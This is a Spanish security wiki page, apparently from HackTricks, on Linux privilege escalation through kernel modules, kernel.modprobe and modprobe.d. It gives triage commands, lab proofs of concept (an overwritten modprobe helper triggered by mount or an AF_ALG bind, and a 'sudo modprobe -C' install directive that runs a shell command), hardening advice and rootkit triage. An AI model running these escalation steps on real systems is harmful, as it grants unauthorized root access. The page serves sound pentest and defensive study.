# Abuso de módulos del kernel y modprobe

{{#include ../../banners/hacktricks-training.md}}

## Errores de configuración de módulos del kernel y de carga de módulos

La compatibilidad con módulos del kernel es un área de gran impacto durante una revisión de escalada de privilegios en Linux. No consideres que todo mensaje sobre módulos sin firmar sea explotable por sí solo; úsalo para responder preguntas prácticas.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- ¿Puede el usuario actual cargar módulos mediante `sudo`, capabilities o una ruta de helper con permisos de escritura?
- ¿Sigue habilitada la carga de módulos?
- ¿Está deshabilitada la aplicación de firmas de módulos?
- ¿Tienen permisos de escritura los directorios de módulos, los archivos de módulos o las rutas de configuración de `modprobe.d`?<sup>[[16]](#references)</sup>
- ¿Se pueden leer los logs del kernel para confirmar qué ocurrió?

El triaje rápido comienza con las siguientes comprobaciones del estado de los módulos, las firmas, el registro y el árbol de módulos.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretación:

- `modules_disabled=1` significa que los módulos no se pueden cargar ni descargar, y el valor no se puede restablecer a `0` hasta el reinicio.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` en la línea de comandos del kernel o `CONFIG_MODULE_SIG_FORCE=y` exige módulos con firmas válidas; de lo contrario, se pueden cargar módulos sin firmar y marcar el kernel como modificado.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` no impone restricciones a `dmesg`; cuando su valor es `1`, se requiere `CAP_SYSLOG` para acceder.<sup>[[1]](#references)</sup>
- Las rutas con permisos de escritura dentro de `/lib/modules/$(uname -r)/` son peligrosas porque `modprobe` busca en ese árbol y en sus datos de dependencias al cargar módulos.<sup>[[8]](#references)</sup>

### Cargar un módulo y leer la salida del kernel

Si tienes permiso legítimo para cargar un módulo local, `insmod` inserta el archivo `.ko` exacto que le indiques. La función de inicialización del módulo se ejecuta como parte de la carga, y los mensajes escritos con `printk()` van al búfer del registro del kernel, que normalmente se lee con `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Un flujo de revisión mínimo usa `modinfo` para inspeccionar los metadatos, `insmod` y `rmmod` para cargar y quitar un módulo, `lsmod` para confirmar que está cargado, y `dmesg` para inspeccionar los registros del kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Si `sudo -l` permite ejecutar `insmod`, `modprobe` o un wrapper que los invoque, considéralo crítico: `sudo -l` muestra los privilegios del usuario que lo ejecuta, y cargar un módulo del kernel requiere `CAP_SYS_MODULE`. Consulta [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) para conocer las vías directas basadas en capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` permitido por sudo

Una regla de sudo que permite a un usuario ejecutar `insmod` no es comparable a permitirle usar una herramienta administrativa normal. El código de inicialización del módulo se ejecuta como parte de su inserción, así que la pregunta práctica al revisarlo es si este usuario puede elegir o modificar el módulo que se va a cargar.<sup>[[3]](#references)</sup>

El siguiente flujo genérico de revisión repite esas comprobaciones de inspección, carga, estado, registro y eliminación para un módulo candidato.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Si el usuario puede proporcionar un archivo `.ko` arbitrario, en una evaluación autorizada debe considerarse que esto equivale a comprometer por completo el sistema. Un patrón operativo más seguro es evitar delegar la carga de módulos mediante sudo; si es inevitable, hay que restringir la ruta exacta, la propiedad, los permisos, la política de firma y el flujo de trabajo para su eliminación.<sup>[[3]](#references)[[10]](#references)</sup>

A continuación se muestran un código fuente mínimo y un Makefile para un patrón inofensivo de compilación de módulos en un laboratorio controlado; la forma `make -C /lib/modules/$(uname -r)/build M=$PWD` sigue el flujo de trabajo kbuild documentado por el kernel para módulos externos.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Compila y carga solo en un laboratorio autorizado; kbuild compila el módulo externo y los comandos load/remove invocan las interfaces de módulos del kernel.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Comprobaciones de abuso de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` indica el helper de espacio de usuario que ejecuta el kernel para las solicitudes de carga automática de módulos; este sysctl afecta a la carga automática, no a la inserción explícita de módulos. Si un atacante puede cambiarlo para que apunte a una ruta ejecutable modificable y desencadenar una solicitud de módulo, ese helper se convierte en una vía de ejecución de código con privilegios. Si se establece como cadena vacía, se desactivan las solicitudes de carga automática; si `CONFIG_STATIC_USERMODEHELPER=y`, cualquier valor no vacío se sustituye por la ruta del helper estático incorporada al compilar.<sup>[[1]](#references)</sup>

Comprueba la ruta actual del helper mediante la interfaz sysctl del kernel e inspecciona el propietario y los permisos del destino.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Comprueba si es posible influir en sysctl, las reglas de sudo delegadas o las capacidades de archivos.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

El siguiente patrón, solo para laboratorios, cambia la ruta del helper y desencadena una solicitud documentada de carga automática de módulos; úsalo únicamente en un sistema aislado y autorizado.<sup>[[1]](#references)</sup>

En los kernels Linux actuales, no uses un ejecutable desconocido como trigger genérico: la carga automática de módulos para formatos binarios personalizados heredados se eliminó en Linux 6.14, mientras que la documentación del kernel identifica un tipo de sistema de archivos desconocido como una vía para solicitar la carga automática de módulos.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

En sistemas reforzados, esto debería fallar cuando los permisos impidan que usuarios sin privilegios escriban en `kernel.modprobe`, la ruta del helper no permita escritura o la carga automática de módulos esté deshabilitada.<sup>[[1]](#references)</sup>

### Activador de carga automática de AF_ALG sin privilegios

El activador del sistema de archivos anterior utiliza `mount` con privilegios.<sup>[[1]](#references)</sup> Cuando hay sockets AF_ALG disponibles, un usuario sin privilegios puede, en cambio, asociar uno a un tipo deliberadamente inexistente.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` solicita entonces `algif-<type>` mediante `request_module()`, que invoca el helper de módulos configurado.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Esto sigue funcionando tras la eliminación, en Linux 6.14, de la carga automática heredada para formatos binarios desconocidos.<sup>[[11]](#references)[[17]](#references)</sup> Se espera que `bind()` falle porque el tipo no existe; comprueba el efecto secundario del helper en lugar del valor de retorno del socket.<sup>[[17]](#references)[[18]](#references)</sup>

En un laboratorio autorizado, primero configura el helper controlado o la regla de `modprobe.d` y, después, activa una solicitud sin `sudo` ni `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ acepta una tupla `(type, name)` para la asociación AF_ALG.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Esta ruta requiere un socket AF_ALG utilizable y un valor no vacío en `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> En los kernels con `/proc/sys/crypto/af_alg_restrict`, el valor `2` deshabilita la creación de sockets AF_ALG; el valor `1` restringe los algoritmos, pero no impide la solicitud de tipo inexistente en `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> Un LSM puede rechazar la solicitud del módulo antes de que se invoque el helper.<sup>[[19]](#references)</sup>

### Configuración de `modprobe.d` modificable y `sudo modprobe -C`

Antes de resolver un módulo, `modprobe` lee archivos `.conf` de directorios de configuración como `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` y `/lib/modprobe.d`, en orden de precedencia. Un archivo con el mismo nombre en un directorio de mayor prioridad oculta el archivo de menor prioridad. Más importante aún, una directiva `install <module> <command>` ejecuta un comando de shell arbitrario **en lugar de** insertar ese módulo. Por lo tanto, una ruta de configuración modificable puede permitir la ejecución diferida de comandos con las credenciales de un usuario que invoque `modprobe` con privilegios más adelante; la aplicación de firmas a módulos del kernel no autentica este comando de espacio de usuario.<sup>[[16]](#references)</sup>

Audita los permisos de directorios y archivos y, luego, inspecciona la configuración efectiva. `modprobe -n -v` es seguro para revisar la resolución, ya que el modo de ejecución de prueba no inserta el módulo ni ejecuta un comando `install`/`remove`. Es preferible usar `modprobe -c` en lugar de la forma heredada `--showconfig`, cuya eliminación después de kmod 36 está indicada en la documentación actual de kmod.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Una regla sudo sin restricciones para `modprobe` es explotable incluso cuando los archivos `.ko` arbitrarios no pueden superar la verificación de firmas: `-C` selecciona un directorio de configuración controlado por el atacante, desde el cual el proceso iniciado por sudo puede ejecutar un comando `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Si un directorio `modprobe.d` visible para el helper del kernel permite escritura, el mismo [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) puede ejecutar inmediatamente una directiva `install algif-htprobe`, sin esperar a que un administrador invoque `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> En un laboratorio autorizado, coloca un comando marcador inofensivo en un archivo `.conf` con permisos de escritura, confirma la resolución con `modprobe -n -v algif-htprobe` y luego ejecuta el trigger anterior.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` y la aplicación de firmas de módulos bloquean la inserción de módulos, no este comando `install` de espacio de usuario; un `kernel.modprobe` vacío o una ruta AF_ALG bloqueada sí impiden esta vía de autoload.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Para mitigar este riesgo, no concedas mediante sudo acceso a `modprobe` sin restricciones de argumentos, mantén todos los directorios de configuración bajo propiedad de root y sin permisos de escritura, y revisa las directivas `install`/`remove` inesperadas. Cuando un flujo administrativo de confianza deba omitir estas directivas para un módulo, `modprobe --ignore-install` las omite para ese módulo, pero las dependencias aún pueden tener sus propios comandos.<sup>[[8]](#references)[[16]](#references)</sup>

### Revisión de `/lib/modules` con permisos de escritura

Los directorios de módulos con permisos de escritura pueden permitir reemplazar módulos, plantar módulos maliciosos o abusar de la carga automática, según cómo se invoque `modprobe` posteriormente; `modprobe` busca en `/lib/modules/$(uname -r)` y usa sus datos de dependencias al resolver módulos.<sup>[[8]](#references)</sup>

Revisa los archivos de módulos y los metadatos de dependencias/alias con permisos de escritura en el árbol de módulos de la versión activa del kernel.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Si encuentras contenido de módulo con permisos de escritura, inspecciona cómo `modprobe` resuelve las dependencias y cómo `modinfo` informa sobre los metadatos del módulo.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Notas defensivas:

- Mantén `/lib/modules` con propietario `root:root` y sin permisos de escritura para los usuarios.<sup>[[8]](#references)</sup>
- Establece `kernel.modules_disabled=1` después del arranque cuando sea operativamente posible.<sup>[[1]](#references)</sup>
- Exige la firma de módulos en los sistemas que necesiten módulos cargables.<sup>[[2]](#references)</sup>
- Supervisa las escrituras en `/proc/sys/kernel/modprobe`, `/lib/modules` y los directorios de configuración `modprobe.d`, además de la ejecución inesperada de `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triaje de rootkits basados en módulos

Un módulo malicioso puede interceptar syscalls, vistas de VFS o `/proc`, rutas de red o comprobaciones de credenciales para ocultar procesos y archivos, redirigir tráfico o interceptar secretos. También puede eliminarse de la lista de módulos que muestra `lsmod`. La persistencia puede provenir de alias o reglas de instalación en `modprobe.d`, de `/etc/modules-load.d`, de una unidad de systemd, del contenido de initramfs o del reemplazo de un archivo `.ko` legítimo. Un resultado normal de `lsmod` es una evidencia útil, pero un compromiso a nivel del kernel puede hacer que las listas proporcionadas por el kernel no sean fiables. Contrasta los módulos cargados, los archivos en disco, la configuración de arranque, los registros de carga de módulos y la telemetría externa de confianza.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Revisa los nombres, las rutas, las dependencias, las firmas y los tiempos de carga de los módulos inesperados. Los mensajes sobre Kernel taint y módulos sin firmar son pistas, no pruebas de la presencia de un rootkit. Si se sospecha de un rootkit, recopila evidencias desde una imagen de confianza o un entorno de recuperación antes de confiar en la salida del kernel en ejecución. La página sobre [evaluación de vulnerabilidades del kernel](kernel-vulnerability-assessment.md) abarca la configuración y la exposición de diagnóstico, incluidos tracefs y los objetos BPF fijados.



## References

- [1] [Documentación de /proc/sys/kernel/ — Documentación del kernel de Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mecanismo de firma de módulos del kernel — Documentación del kernel de Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Página del manual de Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Conceptos básicos de los controladores — Documentación del kernel de Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Registro de mensajes con printk — Documentación del kernel de Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Compilación de módulos externos — Documentación del kernel de Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Página del manual de Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Página del manual de Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Revivir la técnica modprobe_path: superar el parche de search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [Solicitud de módulo y enlace de AF_ALG — Código fuente del kernel de Linux](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Invocación del ayudante de módulos — Código fuente del kernel de Linux](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Documentación de Python](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Documentación del kernel de Linux](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
